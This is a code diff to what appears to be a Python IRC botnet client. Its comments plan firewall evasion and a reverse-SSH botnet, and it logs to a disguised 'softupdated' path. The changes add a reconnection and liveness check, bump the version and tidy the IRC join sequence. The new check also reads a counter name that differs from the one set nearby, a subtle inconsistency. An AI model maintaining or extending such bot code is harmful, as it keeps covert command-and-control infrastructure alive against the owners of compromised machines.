@@ -29,7 +29,7 @@ from modules.logging import logfile, log
 #       openvpn     implement openvpn for firewall evasion
 #       reverse ssh ssh botnet implementation
 
-version = "7.3"                                                                 # bot version
+version = "7.5b"                                                                 # bot version
 
 try:
     logfile(filename="/var/softupdated/bot_v%s(%s).log" % (version, strftime("%m-%d|%H:%M")))                  # redirects bot output to logfile
@@ -183,6 +183,18 @@ def reload_bot():
     irc.send('QUIT\r\n')
     raise SystemExit                                              
     sys.exit()
+
+def still_connected(irc):
+    try:
+        irc.send('PING TEST')
+        data = irc.recv(4096)
+        if data != 'PONG TEST':
+            raise Exception("PING/PONG FAILED")
+        else:
+            return True
+    except Exception as exit_exception:
+        log("[X] Disconnected, PING failed after socket disconnected: %s" % exit_exception)
+        return False
 
 ############ Keyword functions
 
@@ -507,12 +519,11 @@ if __name__ == '__main__':
                 irc.settimeout(60)                                              # timeout for irc.recv
                 irc.connect((server, port))
                 connection_time = time.time()
-                recv = irc.recv (4096)
+                recv = irc.recv(4096)
                 log("[+] Recieved:    ", recv+'\n')
-                irc.send ('NICK %s\r\n' % nick )
-                irc.send ('USER %s %s %s :%s\r\n' % (nick, nick, nick, nick))
-                irc.send ('JOIN %s\r\n' % channel)
-                broadcast('Bot v%s Running.' % version)
+                irc.send('NICK %s\r\n' % nick )
+                irc.send('USER %s %s %s :%s\r\n' % (nick, nick, nick, nick))
+                irc.send('JOIN %s\r\n' % channel)
                 try:
                     privmsg('Bot reloaded due to internal exception: %s' % exit_exception)
                     del exit_exception
@@ -542,6 +553,12 @@ if __name__ == '__main__':
                         data = str(time.time())
                         timedout_count = 0
                         pass
+
+                if len(data) < 1 or timeout_count > 5:                          # check connection when instability is detected or a blank message is recieved from the server
+                    if still_connected(irc):
+                        timeout_count = 0
+                    else:
+                        reload_bot()
 
                 if data.find('ickname is already in use') != -1:
                     nick += str(random.randint(1,200))
